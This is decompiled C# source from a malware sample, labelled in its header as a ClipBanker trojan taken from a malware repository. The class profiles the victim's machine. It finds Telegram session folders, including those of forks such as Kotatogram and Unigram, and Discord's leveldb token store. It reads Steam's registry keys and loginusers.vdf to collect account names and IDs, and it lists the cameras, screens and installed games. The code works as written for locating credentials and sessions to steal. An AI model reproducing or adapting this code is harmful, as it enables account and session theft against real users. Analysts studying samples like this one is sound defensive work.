// Decompiled with JetBrains decompiler
// Type: V89.u8L
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00312k;
using \u0031xm;
using \u0036e5;
using \u0037az;
using BMB;
using Microsoft.Win32;
using o3x;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace V89
{
  internal static class u8L
  {
    public static string B22()
    {
      if (Ej4.Ev6)
        return "Disabled";
      List<string> values = new List<string>();
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
        {
          foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
            values.Add(managementBaseObject["Caption"].ToString());
        }
      }
      catch
      {
      }
      return values.Count > 0 ? string.Join("\r\n", (IEnumerable<string>) values) : "";
    }

    public static string j8E()
    {
      string str = string.Empty;
      foreach (Screen allScreen in Screen.AllScreens)
      {
        try
        {
          str = str + allScreen.DeviceName + "\r\n";
        }
        catch
        {
        }
      }
      return str;
    }

    public static string cub()
    {
      List<string> values = new List<string>();
      try
      {
        uint num1 = \u0036b9.\u0034M4.\u003646();
        \u0036b9.\u0034M4.v8N structure = new \u0036b9.\u0034M4.v8N();
        for (uint index = 0; index < num1; ++index)
        {
          try
          {
            int num2 = (int) \u0036b9.\u0034M4.I21(index, ref structure, (uint) Marshal.SizeOf((object) structure));
            values.Add(structure.\u00373o);
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      return values.Count > 0 ? string.Join("\r\n", (IEnumerable<string>) values) : "";
    }

    public static string e47()
    {
      try
      {
        string str = string.Empty;
        try
        {
          str = new Regex("(\\w\\W.+)Telegram.exe").Match((string) Registry.GetValue("HKEY_CLASSES_ROOT\\tdesktop.tg\\shell\\open\\command", (string) null, (object) null)).Value.Replace("Telegram.exe", "");
        }
        catch
        {
        }
        if (!Directory.Exists(str + "/tdata"))
        {
          int index = 0;
          List<Process> processList = new List<Process>();
          processList.AddRange((IEnumerable<Process>) Process.GetProcessesByName("Telegram"));
          processList.AddRange((IEnumerable<Process>) Process.GetProcessesByName("Kotatogram"));
          processList.AddRange((IEnumerable<Process>) Process.GetProcessesByName("Unigram"));
          processList.AddRange((IEnumerable<Process>) Process.GetProcessesByName("Telefuel"));
          while (!Directory.Exists(str + "/tdata"))
          {
            try
            {
              str = Path.GetDirectoryName(\u0036b9.M34(processList[index]));
              ++index;
            }
            catch
            {
              break;
            }
          }
        }
        return str;
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string Gpv()
    {
      try
      {
        if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\"))
          return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string \u003756()
    {
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Valve\\Steam");
        string str = (string) registryKey.GetValue("AutoLoginUser");
        registryKey.Close();
        return str;
      }
      catch
      {
        try
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Valve\\Steam");
          string str = (string) registryKey.GetValue("AutoLoginUser");
          registryKey.Close();
          return str;
        }
        catch
        {
        }
      }
      return "Unknown";
    }

    public static string \u003777()
    {
      try
      {
        string str = u8L.\u003756();
        using (IEnumerator<\u0039U7> enumerator = ((cd2) new \u003843(File.ReadAllText(u8L.W33() + "/config/loginusers.vdf")).\u0038zf()).\u0023O())
        {
          while (enumerator.MoveNext())
          {
            cd2 current = (cd2) enumerator.Current;
            if (((\u0033nw) current.\u00355D("AccountName")).\u003554() == str)
              return current.KB7();
          }
        }
      }
      catch
      {
      }
      return "Unknown";
    }

    public static List<string[]> \u0032hf()
    {
      try
      {
        List<string[]> strArrayList = new List<string[]>();
        using (IEnumerator<\u0039U7> enumerator = ((cd2) new \u003843(File.ReadAllText(u8L.W33() + "/config/loginusers.vdf")).\u0038zf()).\u0023O())
        {
          while (enumerator.MoveNext())
          {
            cd2 current = (cd2) enumerator.Current;
            \u0033nw obj = (\u0033nw) current.\u00355D("AccountName");
            strArrayList.Add(new string[3]
            {
              current.KB7(),
              obj.\u003554(),
              "https://steamcommunity.com/profiles/" + current.KB7()
            });
          }
        }
        return strArrayList;
      }
      catch
      {
      }
      return new List<string[]>();
    }

    public static string Tf7()
    {
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Valve\\Steam");
        string str = (string) registryKey.GetValue("Language");
        registryKey.Close();
        return str;
      }
      catch
      {
        try
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Valve\\Steam");
          string str = (string) registryKey.GetValue("Language");
          registryKey.Close();
          return str;
        }
        catch
        {
        }
      }
      return "Unknown";
    }

    public static string W33()
    {
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Valve\\Steam");
        string str = (string) registryKey.GetValue("SteamPath");
        registryKey.Close();
        return str;
      }
      catch
      {
        try
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Valve\\Steam");
          string str = (string) registryKey.GetValue("SteamPath");
          registryKey.Close();
          return str;
        }
        catch
        {
        }
      }
      return "Unknown";
    }

    public static string Gw2()
    {
      try
      {
        string str1 = u8L.W33();
        string str2 = string.Empty;
        if (Directory.Exists(str1 + "/steamapps/common"))
        {
          foreach (string directory in Directory.GetDirectories(str1 + "/steamapps/common"))
            str2 = str2 + Path.GetFileName(directory) + "\r\n";
        }
        return str2;
      }
      catch
      {
      }
      return string.Empty;
    }
  }
}
